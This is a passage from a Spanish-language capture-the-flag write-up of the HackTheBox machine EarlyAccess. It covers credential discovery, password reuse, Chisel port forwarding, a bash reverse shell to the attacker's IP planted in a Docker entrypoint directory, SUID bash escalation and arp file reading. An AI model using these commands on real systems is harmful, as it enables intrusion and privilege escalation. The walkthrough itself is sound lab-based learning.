5000/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 2.36 seconds
```

Comprobemos si podemos lanzar peticiones contra esta API desde este contenedor:

```console
www-adm@webserver:/tmp/wildzarek$ curl 172.18.0.101:5000
{"message":"Welcome to the game-key verification API! You can verify your keys via: /verify/<game-key>.
If you are using manual verification, you have to synchronize the magic_num here.
Admin users can verify the database using /check_db.","status":200}
```

Parece que podemos verificar la base de datos utilizando **`/check_db`** en la consulta como parte de la ruta URL,
pero necesitamos encontrar un modo de lanzar consultas a la API como usuario administrador, revisemos en el directorio del usuario.

```console
www-adm@webserver:/tmp/wildzarek$ cd
www-adm@webserver:~$ ls -la
total 40
drwxr-xr-x 3 www-adm www-adm  4096 Feb 13 00:28 .
drwxr-xr-x 1 root    root     4096 Feb 11 05:19 ..
lrwxrwxrwx 1 root    root        9 Feb 11 05:19 .bash_history -> /dev/null
-rw-r--r-- 1 www-adm www-adm   220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 www-adm www-adm  3526 Apr 18  2019 .bashrc
drwx------ 3 www-adm www-adm  4096 Feb 12 09:20 .config
-rw-r--r-- 1 www-adm www-adm   807 Apr 18  2019 .profile
-rw-r--r-- 1 www-adm www-adm     0 Feb 11 23:32 .selected_editor
-rw------- 1 www-adm www-adm 10256 Feb 13 00:28 .viminfo
-r-------- 1 www-adm www-adm    33 Feb 11 05:19 .wgetrc
```

Me llama la atención el archivo **`.wgetrc`**, sólo tenemos permisos de lectura.

```console
www-adm@webserver:~$ cat .wgetrc 
user=api
password=s3CuR3_API_PW!
```

Ojo, tenemos credenciales así que probemos de nuevo:

```console
www-adm@webserver:~$ curl http://172.18.0.101:5000/check_db -u api:s3CuR3_API_PW!
```

El output es una sóla línea **`JSON`** bastante extensa así que lo copiamos en nuestra máquina y le pasamos **`jq`** para verlo más organizado.
Os dejo la parte interesante del archivo, ya que encontramos las credenciales de un nuevo usuario a la base de datos:

```json
      "Env": [
        "MYSQL_DATABASE=db",
        "MYSQL_USER=drew",
        "MYSQL_PASSWORD=drew",
        "MYSQL_ROOT_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5",
        "SERVICE_TAGS=dev",
        "SERVICE_NAME=mysql",
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        "GOSU_VERSION=1.12",
        "MYSQL_MAJOR=8.0",
        "MYSQL_VERSION=8.0.25-1debian10"
      ],
```

Podemos comprobar si se reutiliza esta contraseña, por ejemplo para conectarnos por SSH como el usuario **`drew`**.

```console
p3ntest1ng:~$ ssh drew@10.10.11.110
drew@10.10.11.110's password: 
Linux earlyaccess 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Sat Feb 12 22:16:59 2022 from 10.10.15.33
drew@earlyaccess:~$ ls -la
total 3092
drwxr-xr-x 5 drew drew    4096 Feb 12 22:23 .
drwxr-xr-x 4 root root    4096 Jul 14  2021 ..
lrwxrwxrwx 1 root root       9 Jul 14  2021 .bash_history -> /dev/null
-rw-r--r-- 1 drew drew     220 May 24  2021 .bash_logout
-rw-r--r-- 1 drew drew    3526 May 24  2021 .bashrc
drwx------ 3 drew drew    4096 Feb 12 22:23 .gnupg
-rwxr-xr-x 1 drew drew 3125160 Feb 12 22:05 linpeas
drwxr-xr-x 3 drew drew    4096 Feb 12 21:34 .local
-rw-r--r-- 1 drew drew     807 May 24  2021 .profile
-rw-r--r-- 1 drew drew      66 Feb 12 21:34 .selected_editor
drwxr-x--- 2 drew drew    4096 Aug 25 23:45 .ssh
-r-------- 1 drew drew      33 Feb 11 06:18 user.txt
drew@earlyaccess:~$ cat user.txt
d9f0818533d005d66c99f3e24de46e6d
```

Tenemos la flag de usuario, enhorabuena pentesters. De paso podemos copiarnos las claves SSH (id_rsa e id_rsa.pub) en nuestra máquina local.
Si abrimos el .pub vemos que está generado para **`game-tester@game-server`**. Anotemos este dato.

```console
drew@earlyaccess:~$ cd .ssh
drew@earlyaccess:~/.ssh$ ls
id_rsa  id_rsa.pub
drew@earlyaccess:~/.ssh$ cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDMYU1DjEX8HWBPFBxoN+JXFBJUZBPr+IFO5yI25HMkFSlQZLaJajtEHeoBsD1ldSi7Q0qHYvVhYh7euYhr85vqa3cwGqJqJH54Dr5WkNDbqrB5AfgOWkUIomV4QkfZSmKSmI2UolEjVf1pIYYsJY+glqzJLF4hQ8x4d2/vJj3CmWDJeA0AGH0+3sjpmpYyoY+a2sW0JAPCDvovO1aT7FOnYKj3Qyl7NDGwJkOoqzZ66EmU3J/1F0e5XNg74wK8dvpZOJMzHola1CS8NqRhUJ7RO2EEZ0ITzmuLmY9s2N4ZgQPlwUvhV5Aj9hqckV8p7IstrpdGsSbZEv4CR2brsEhwsspAJHH+350e3dCYMR4qDyitsLefk2ezaBRAxrXmZaeNeBCZrZmqQ2+Knak6JBhLge9meo2L2mE5IoPcjgH6JBbYOMD/D3pC+MAfxtNX2HhB6MR4Rdo7UoFUTbp6KIpVqtzEB+dV7WeqMwUrrZjs72qoGvO82OvGqJON5F/OhoHDao+zMJWxNhE4Zp4DBii39qhm2wC6xPvCZT0ZSmdCe3pB82Jbq8yccQD0XGtLgUFv1coaQkl/CU5oBymR99AXB/QnqP8aML7ufjPbzzIEGRfJVE2A3k4CQs4Zo+GAEq7WNy1vOJ5rZBucCUXuc2myZjHXDw77nvettGYr5lcS8w== game-tester@game-server
drew@earlyaccess:~/.ssh$
```

Ahora vamos a por la escalada de privilegios...

## Escalada de Privilegios

Nos creamos un directorio en **`/tmp/`** como hicimos anteriormente, subiremos aquí el binario de nmap para enumerar.

```console
drew@earlyaccess:~/.ssh$ mkdir /tmp/wildzarek
drew@earlyaccess:~/.ssh$ cd !$
cd /tmp/wildzarek
drew@earlyaccess:/tmp/wildzarek$ hostname -I
10.10.11.110 172.17.0.1 172.18.0.1 172.19.0.1 
drew@earlyaccess:/tmp/wildzarek$ wget http://10.10.16.29/nmap
--2022-02-13 02:43:16--  http://10.10.16.29/nmap
Connecting to 10.10.16.29:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5944464 (5.7M) [application/octet-stream]
Saving to: ‘nmap’

nmap 100%[=====================================>]   5.67M  2.23MB/s    in 2.5s

2022-02-13 02:43:19 (2.23 MB/s) - ‘nmap’ saved [5944464/5944464]

drew@earlyaccess:/tmp/wildzarek$ chmod +x nmap
```

Empezamos comprobando el hostname de la máquina y continuamos buscando los hosts activos como hicimos en el anterior contenedor.

```console
drew@earlyaccess:/tmp/wildzarek$ hostname -I
10.10.11.110 172.17.0.1 172.18.0.1 172.19.0.1 
drew@earlyaccess:/tmp/wildzarek$ ./nmap -sn 172.18.0.1/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-02-13 02:59 CET
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.18.0.1
Host is up (0.00059s latency).
Nmap scan report for 172.18.0.2
Host is up (0.00038s latency).
Nmap scan report for 172.18.0.100
Host is up (0.000096s latency).
Nmap scan report for 172.18.0.101
Host is up (0.00024s latency).
Nmap scan report for 172.18.0.102
Host is up (0.00016s latency).
Nmap done: 256 IP addresses (5 hosts up) scanned in 15.41 seconds
```

Recordemos que **`172.18.0.2`** corresponde al contenedor **`admin-simulation.app_nw`**, centremos la atención en **`172.19.0.4`**
Probemos a conectarnos por SSH con las claves del usuario **`drew`**:

```console
drew@earlyaccess:/tmp/wildzarek$ ssh -i $HOME/.ssh/id_rsa game-tester@172.19.0.4
The authenticity of host '172.19.0.4 (172.19.0.4)' can't be established.
ECDSA key fingerprint is SHA256:QGqB7McazHmqza1M22cUpTR7oLwbktNXZZOJFO5ygQA.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.19.0.4' (ECDSA) to the list of known hosts.
Linux game-server 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
game-tester@game-server:~$ id
uid=1001(game-tester) gid=1001(game-tester) groups=1001(game-tester)
game-tester@game-server:~$ ls -la
total 24
drwxr-xr-x 1 game-tester game-tester 4096 Jul 14  2021 .
drwxr-xr-x 1 root        root        4096 Jul 14  2021 ..
-rw-r--r-- 1 game-tester game-tester  220 May 15  2017 .bash_logout
-rw-r--r-- 1 game-tester game-tester 3526 May 15  2017 .bashrc
-rw-r--r-- 1 game-tester game-tester  675 May 15  2017 .profile
drwxr-xr-x 1 root        root        4096 Aug 18 14:24 .ssh
game-tester@game-server:~$ hostname -I
172.19.0.4
```

> NOTA: Estas direcciones cambian con cada reinicio de la máquina por lo que si no te puedes conectar por SSH a la misma que yo, prueba con otra.

Repetimos una vez más el proceso de subir a este contenedor una copia del binario nmap que ya tenemos descargado previamente en nuestra máquina.
Levantamos un servidor http con python3 en **`/tmp/wildzarek`**, y desde la máquina EarlyAccess tiramos wget hacia nuestro servidor.

```console
game-tester@game-server:~$ mkdir /tmp/wildzarek
game-tester@game-server:~$ cd !$
cd /tmp/wildzarek
game-tester@game-server:/tmp/wildzarek$ wget http://10.10.16.29/nmap
--2022-02-13 02:07:08--  http://10.10.16.29/nmap
Connecting to 10.10.16.29:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5944464 (5.7M) [application/octet-stream]
Saving to: 'nmap'

nmap 100%[=====================================>]   5.67M  1.29MB/s    in 5.9s

2022-02-13 02:07:14 (984 KB/s) - 'nmap' saved [5944464/5944464]

game-tester@game-server:/tmp/wildzarek$ chmod +x nmap
```

Y volvemos a repetir el escaneo de puertos abiertos bajo este contenedor:

```console
game-tester@game-server:/tmp/wildzarek$ ./nmap -p- -sT 172.19.0.4

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-02-13 02:18 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for game-server (172.19.0.4)
Host is up (0.00012s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
9999/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.90 seconds
```

Vemos el puerto **`9999`** abierto, dado que estamos en un contenedor, no podemos conectarnos desde el exterior,
tenemos que utilizar **`Chisel`** para realizar [Port-Forwarding](https://es.wikipedia.org/wiki/Redirecci%C3%B3n_de_puertos) desde nuestra máquina.

Si no lo tenemos instalado, podemos instalarlo en nuestra máquina de este modo: 

```console
p3ntest1ng:~$ curl https://i.jpillora.com/chisel! | bash
```

Nos descargamos también los binarios comprimidos desde Github para poder subirlos a la máquina EarlyAccess.

```console
p3ntest1ng:~$ mkdir /tmp/$USER
p3ntest1ng:~$ cd !$
p3ntest1ng:~$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
p3ntest1ng:~$ gunzip chisel_1.7.7_linux_amd64.gz
p3ntest1ng:~$ mv chisel_1.7.7_linux_amd64 chisel
p3ntest1ng:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Ahora desde la máquina EarlyAccess lanzamos wget hacia nuestra máquina y descargarmos Chisel...

```console
game-tester@game-server:/tmp/wildzarek$ wget http://10.10.16.29/chisel
--2022-02-13 02:37:31--  http://10.10.16.29/chisel
Connecting to 10.10.16.29:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8077312 (7.7M) [application/octet-stream]
Saving to: 'chisel'

chisel 100%[=====================================>]   7.70M  2.15MB/s    in 3.7s

2022-02-13 02:37:35 (2.06 MB/s) - 'chisel' saved [8077312/8077312]
game-tester@game-server:/tmp/wildzarek$ chmod +x chisel
```

Finalmente ya estamos listos para utilizar Chisel, primero en nuestra máquina levantamos el servidor tunelizado:

```console
p3ntest1ng:~$ chisel server -p 8000 --reverse
2022/02/13 03:21:28 server: Reverse tunnelling enabled
2022/02/13 03:21:28 server: Fingerprint 2+d8X0xkeeLGtxsA6wkXXNU/M4H6IiHyghQ9WVo7Xx0=
2022/02/13 03:21:28 server: Listening on http://0.0.0.0:8000
```

Nos conectamos desde EarlyAccess hacia nuestra máquina:

```console
game-tester@game-server:/tmp/wildzarek$ ./chisel client 10.10.16.29:8000 R:127.0.0.1:9999:172.19.0.4:9999
2022/02/13 02:41:21 client: Connecting to ws://10.10.16.29:8000
2022/02/13 02:41:23 client: Connected (Latency 113.972594ms)
```

Si vamos al navegador en nuestra máquina y abrimos **http://127.0.0.1:9999/** encontramos un entorno de pruebas para un juego.
En el apartado autoplay podemos simular un total de N partidas, pero si ponemos un número negativo, 
se produce un fallo en la aplicación y ésta se reinicia pasado un minuto aprox. Aprovecharemos esto para meter una shell inversa.

![Game Test](/assets/images/hackthebox/machines/earlyaccess/gametest1.png)

![Game Test](/assets/images/hackthebox/machines/earlyaccess/gametest2.png)

Antes de continuar, vamos a revisar el directorio raíz para ver qué encontramos:

```console
game-tester@game-server:~$ ls /
bin  boot  dev  docker-entrypoint.d  entrypoint.sh  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
game-tester@game-server:~$ 
```

Vemos el directorio de montaje de Docker y un archivo **`entrypoint.sh`**:

```console
game-tester@game-server:~$ cat /entrypoint.sh 
#!/bin/bash
for ep in /docker-entrypoint.d/*; do
if [ -x "${ep}" ]; then
    echo "Running: ${ep}"
    "${ep}" &
  fi
done
tail -f /dev/null
```

Básicamente aquí lo que está haciendo es buscar cualquier archivo en **`/docker-entrypoint.d/`** y lo ejecuta.
Por último hace **`tail -f`** al **`/dev/null`** para prevenir que el script termine y que el contenedor se esté ejecutando continuamente.
Dentro del directorio de montaje de Docker hay un script **`node-server.sh`**:

```console
game-tester@game-server:~$ cat /docker-entrypoint.d/node-server.sh 
service ssh start

cd /usr/src/app

# Install dependencies
npm install

sudo -u node node server.js
game-tester@game-server:/$ touch /docker-entrypoint.d/test
touch: cannot touch '/docker-entrypoint.d/test': Permission denied
```

No tenemos permisos de escritura en este directorio, pero desde el host sí que tenemos permiso:

```console
drew@earlyaccess:/opt/docker-entrypoint.d$ touch test
drew@earlyaccess:/opt/docker-entrypoint.d$ ls
node-server.sh  test
drew@earlyaccess:/opt/docker-entrypoint.d$ ls
node-server.sh
```

El contenido del directorio es borrado periódicamente, con una frecuencia de 30 segundos (aprox.).
La idea aquí es realizar una serie de pasos para ganar acceso como **`root`** bajo el host **`game-server`**:

1. Crear un script en bash con la shell inversa hacia nuestra máquina y copiarla en bucle dentro de **`/docker-entrypoint.d/`**
2. Provocar un fallo en la aplicación **`autoplay`** para que se reinicie y ejecute nuestra shell con privilegios.
3. Una vez tengamos acceso privilegiado, copiaremos en bucle el binario **`bash`** dentro de **`/docker-entrypoint.d/`**
4. Desde la shell con **`root`** le asignaremos como propietario nuestro usuario privilegiado al binario y le daremos permisos SUID
5. Desde la shell con **`drew`** ejecutamos el binario privilegiado y de este modo habremos escalado privilegios.

Necesitamos varias instancias para llevar a cabo esta idea y debemos realizar estas tareas muy rápido.

#### Shell A (nosotros)

```console
p3ntest1ng:~$ nc -nlvp 6969
´listening on [any] 6969 ...
```

#### Shell A (drew)

```console
drew@earlyaccess$ cd /tmp/wildzarek
drew@earlyaccess:/tmp/wildzarek$ nano rvs.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.29/6969 0>&1
drew@earlyaccess:/tmp/wildzarek$ chmod +x rvs.sh
drew@earlyaccess:/tmp/wildzarek$ while true; do cp rvs.sh /opt/docker-entrypoint.d/; sleep 0.2; done
```

Podemos enviar una simple petición con **`curl`** y provocar el fallo:
> curl 127.0.0.1:9999/autoplay -d 'rounds=-1'

O bien hacer un pequeño script en python y enviar la petición POST:

#### Shell B (nosotros)
```console
p3ntest1ng:~$ nano autoplay_crasher.py
#!/usr/bin/env python
import requests
target = "http://127.0.0.1:9999/autoplay"
payload = {"rounds": "-1", "verbose": "false"}
r = requests.post(target, data=payload, verify=False)
p3ntest1ng:~$ chmod +x autoplay_crasher.py
p3ntest1ng:~$ python3 autoplay_crasher.py
```

Si todo ha ido bien, deberíamos haber obtenido acceso privilegiado dentro de **`game-server`**

#### Shell C (root)

```console
p3ntest1ng:~$ nc -nlvp 6969
listening on [any] 6969 ...
connect to [10.10.16.29] from (UNKNOWN) [10.10.11.110] 40644
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@game-server:/usr/src/app# ls
ls
assets
node_modules
package-lock.json
package.json
server.js
views
root@game-server:~# cd /docker-entrypoint.d/
root@game-server:/docker-entrypoint.d# ls
node-server.sh	rvs.sh
```

Ahora que tenemos acceso privilegiado en este host, podemos parar el bucle que copiaba nuestro **`rvs.sh`** (shell A de drew)
Finalmente, iniciamos un nuevo bucle para copiar el binario bash.

#### Shell A (drew)

```console
drew@earlyaccess:/tmp/wildzarek$ while true; do cp /usr/bin/bash /opt/docker-entrypoint.d/; sleep 0.2; done
```

#### Shell B (root@game-server)

```console
root@game-server:/docker-entrypoint.d# ls
bash  node-server.sh
root@game-server:/docker-entrypoint.d# cd /
root@game-server:/docker-entrypoint.d# chown root:root /docker-entrypoint.d/bash && chmod u+s /docker-entrypoint.d/bash
```

Rápidamente nos cambiamos a la shell de drew, paramos el bucle y ejecutamos el binario:

#### Shell B (drew)

```console
drew@earlyaccess:~$ /opt/docker-entrypoint.d/bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
d99e8664c60877c11df870484ab97f69
```

Esta ha sido una forma demasiado rebuscada y realmente no es como debe escalarse privilegios. Veamos el método corto.
> NOTA: Por alguna razón que desconozco, esta vía sólo es posible cuando te conectas a **game-tester@game-server** por SSH desde el hostname **172.19.0.4**

```console
bash-5.0# find / -group adm 2>/dev/null
/var/log/syslog.2.gz
/var/log/user.log.1
...[snip]...
/var/log/daemon.log.1
/var/log/syslog.3.gz
/usr/sbin/arp
```

Vemos que el grupo **`adm`** dispone del binario **`arp`**, podemos listar las capabilities del binario:

```console
bash-5.0# ls -l /usr/sbin/arp
-rwxr-x--- 1 root adm 67512 Sep 24  2018 /usr/sbin/arp
bash-5.0# /usr/sbin/getcap /usr/sbin/arp
/usr/sbin/arp =ep
```

Si buscamos en [GTFOBins](https://gtfobins.github.io/gtfobins/arp/) vemos que es posible leer archivos:

```bash
LFILE=file_to_read
arp -v -f "$LFILE"
```

```console
bash-5.0# /usr/sbin/arp -v -f "/root/root.txt"
>> d99e8664c60877c11df870484ab97f69
arp: format error on line 1 of etherfile /root/root.txt !
```

De este modo podemos leer también el archivo **`id_rsa`** que se encuentra en **`/root/.ssh/`** y así poder conectarnos directamente por SSH.

### ¡Gracias por leer hasta el final!

Una máquina acorde a su nivel, con mucha enumeración y varias técnicas/vulnerabilidades distintas que explotar, muy entretenida.

#### Nos vemos en un próximo. ¡Feliz hacking! ☠
